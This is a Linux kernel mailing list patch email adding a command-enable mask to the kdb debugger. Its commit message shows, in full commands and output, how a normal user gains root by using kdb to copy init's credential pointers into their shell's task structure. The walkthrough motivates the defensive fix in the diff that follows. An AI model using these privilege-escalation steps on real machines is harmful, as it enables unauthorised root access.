Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751740AbaKFOjF (ORCPT <rfc822;w@1wt.eu>);
	Thu, 6 Nov 2014 09:39:05 -0500
Received: from mail-wi0-f177.google.com ([209.85.212.177]:62430 "EHLO
	mail-wi0-f177.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751054AbaKFOiS (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Thu, 6 Nov 2014 09:38:18 -0500
From: Daniel Thompson <daniel.thompson@linaro.org>
To: Jason Wessel <jason.wessel@windriver.com>
Cc: Anton Vorontsov <anton.vorontsov@linaro.org>,
        kgdb-bugreport@lists.sourceforge.net, linux-kernel@vger.kernel.org,
        Andrew Morton <akpm@linux-foundation.org>,
        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
        Jiri Slaby <jslaby@suse.cz>, Steven Rostedt <rostedt@goodmis.org>,
        Frederic Weisbecker <fweisbec@gmail.com>,
        Ingo Molnar <mingo@redhat.com>, Colin Cross <ccross@android.com>,
        kernel-team@android.com, patches@linaro.org,
        linaro-kernel@lists.linaro.org, John Stultz <john.stultz@linaro.org>,
        Sumit Semwal <sumit.semwal@linaro.org>,
        Daniel Thompson <daniel.thompson@linaro.org>
Subject: [RESEND PATCH v5 3.18-rc3 7/8] kdb: Add enable mask for groups of commands
Date: Thu,  6 Nov 2014 14:36:46 +0000
Message-Id: <1415284607-7628-8-git-send-email-daniel.thompson@linaro.org>
X-Mailer: git-send-email 1.9.3
In-Reply-To: <1415284607-7628-1-git-send-email-daniel.thompson@linaro.org>
References: <1415284607-7628-1-git-send-email-daniel.thompson@linaro.org>
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

From: Anton Vorontsov <anton.vorontsov@linaro.org>

Currently all kdb commands are enabled whenever kdb is deployed. This
makes it difficult to deploy kdb to help debug certain types of
systems.

Android phones provide one example; the FIQ debugger found on some
Android devices has a deliberately weak set of commands to allow the
debugger to enabled very late in the production cycle.

Certain kiosk environments offer another interesting case where an
engineer might wish to probe the system state using passive inspection
commands without providing sufficient power for a passer by to root it.

Without any restrictions, obtaining the root rights via KDB is a matter of
a few commands, and works everywhere. For example, log in as a normal
user:

cbou:~$ id
uid=1001(cbou) gid=1001(cbou) groups=1001(cbou)

Now enter KDB (for example via sysrq):

Entering kdb (current=0xffff8800065bc740, pid 920) due to Keyboard Entry
kdb> ps
23 sleeping system daemon (state M) processes suppressed,
use 'ps A' to see all.
Task Addr               Pid   Parent [*] cpu State Thread             Command
0xffff8800065bc740      920      919  1    0   R  0xffff8800065bca20 *bash

0xffff880007078000        1        0  0    0   S  0xffff8800070782e0  init
[...snip...]
0xffff8800065be3c0      918        1  0    0   S  0xffff8800065be6a0  getty
0xffff8800065b9c80      919        1  0    0   S  0xffff8800065b9f60  login
0xffff8800065bc740      920      919  1    0   R  0xffff8800065bca20 *bash

All we need is the offset of cred pointers. We can look up the offset in
the distro's kernel source, but it is unnecessary. We can just start
dumping init's task_struct, until we see the process name:

kdb> md 0xffff880007078000
0xffff880007078000 0000000000000001 ffff88000703c000   ................
0xffff880007078010 0040210000000002 0000000000000000   .....!@.........
[...snip...]
0xffff8800070782b0 ffff8800073e0580 ffff8800073e0580   ..>.......>.....
0xffff8800070782c0 0000000074696e69 0000000000000000   init............

^ Here, 'init'. Creds are just above it, so the offset is 0x02b0.

Now we set up init's creds for our non-privileged shell:

kdb> mm 0xffff8800065bc740+0x02b0 0xffff8800073e0580
0xffff8800065bc9f0 = 0xffff8800073e0580
kdb> mm 0xffff8800065bc740+0x02b8 0xffff8800073e0580
0xffff8800065bc9f8 = 0xffff8800073e0580

And thus gaining the root:

kdb> go
cbou:~$ id
uid=0(root) gid=0(root) groups=0(root)
cbou:~$ bash
root:~#

p.s. No distro enables kdb by default (although, with a nice KDB-over-KMS
feature availability, I would expect at least some would enable it), so
it's not actually some kind of a major issue.

Signed-off-by: Anton Vorontsov <anton.vorontsov@linaro.org>
Signed-off-by: John Stultz <john.stultz@linaro.org>
Signed-off-by: Daniel Thompson <daniel.thompson@linaro.org>
Cc: Jason Wessel <jason.wessel@windriver.com>
---
 include/linux/kdb.h         |  1 +
 kernel/debug/kdb/kdb_main.c | 30 +++++++++++++++++++++++++++++-
 2 files changed, 30 insertions(+), 1 deletion(-)

diff --git a/include/linux/kdb.h b/include/linux/kdb.h
index f1fe361..75ae2e2 100644
--- a/include/linux/kdb.h
+++ b/include/linux/kdb.h
@@ -105,6 +105,7 @@ extern atomic_t kdb_event;
 #define KDB_BADLENGTH	(-19)
 #define KDB_NOBP	(-20)
 #define KDB_BADADDR	(-21)
+#define KDB_NOPERM	(-22)
 
 /*
  * kdb_diemsg
diff --git a/kernel/debug/kdb/kdb_main.c b/kernel/debug/kdb/kdb_main.c
index fae1fc3..fe1ac56 100644
--- a/kernel/debug/kdb/kdb_main.c
+++ b/kernel/debug/kdb/kdb_main.c
@@ -12,6 +12,7 @@
  */
 
 #include <linux/ctype.h>
+#include <linux/types.h>
 #include <linux/string.h>
 #include <linux/kernel.h>
 #include <linux/kmsg_dump.h>
@@ -23,6 +24,7 @@
 #include <linux/vmalloc.h>
 #include <linux/atomic.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/mm.h>
 #include <linux/init.h>
 #include <linux/kallsyms.h>
@@ -42,6 +44,12 @@
 #include <linux/slab.h>
 #include "kdb_private.h"
 
+#undef	MODULE_PARAM_PREFIX
+#define	MODULE_PARAM_PREFIX "kdb."
+
+static int kdb_cmd_enabled;
+module_param_named(cmd_enable, kdb_cmd_enabled, int, 0600);
+
 #define GREP_LEN 256
 char kdb_grep_string[GREP_LEN];
 int kdb_grepping_flag;
@@ -121,6 +129,7 @@ static kdbmsg_t kdbmsgs[] = {
 	KDBMSG(BADLENGTH, "Invalid length field"),
 	KDBMSG(NOBP, "No Breakpoint exists"),
 	KDBMSG(BADADDR, "Invalid address"),
+	KDBMSG(NOPERM, "Permission denied"),
 };
 #undef KDBMSG
 
@@ -496,6 +505,15 @@ int kdbgetaddrarg(int argc, const char **argv, int *nextarg,
 	kdb_symtab_t symtab;
 
 	/*
+	 * If the enable flags prohibit both arbitrary memory access
+	 * and flow control then there are no reasonable grounds to
+	 * provide symbol lookup.
+	 */
+	if (!kdb_check_flags(KDB_ENABLE_MEM_READ | KDB_ENABLE_FLOW_CTRL,
+			     kdb_cmd_enabled, false))
+		return KDB_NOPERM;
+
+	/*
 	 * Process arguments which follow the following syntax:
 	 *
 	 *  symbol | numeric-address [+/- numeric-offset]
@@ -1028,6 +1046,10 @@ int kdb_parse(const char *cmdstr)
 
 	if (i < kdb_max_commands) {
 		int result;
+
+		if (!kdb_check_flags(tp->cmd_flags, kdb_cmd_enabled, argc <= 1))
+			return KDB_NOPERM;
+
 		KDB_STATE_SET(CMD);
 		result = (*tp->cmd_func)(argc-1, (const char **)argv);
 		if (result && ignore_errors && result > KDB_CMD_GO)
@@ -1939,10 +1961,14 @@ static int kdb_rm(int argc, const char **argv)
  */
 static int kdb_sr(int argc, const char **argv)
 {
+	bool check_mask =
+	    !kdb_check_flags(KDB_ENABLE_ALL, kdb_cmd_enabled, false);
+
 	if (argc != 1)
 		return KDB_ARGCOUNT;
+
 	kdb_trap_printk++;
-	__handle_sysrq(*argv[1], false);
+	__handle_sysrq(*argv[1], check_mask);
 	kdb_trap_printk--;
 
 	return 0;
@@ -2393,6 +2419,8 @@ static int kdb_help(int argc, const char **argv)
 			return 0;
 		if (!kt->cmd_name)
 			continue;
+		if (!kdb_check_flags(kt->cmd_flags, kdb_cmd_enabled, true))
+			continue;
 		if (strlen(kt->cmd_usage) > 20)
 			space = "\n                                    ";
 		kdb_printf("%-15.15s %-20s%s%s\n", kt->cmd_name,
-- 
1.9.3

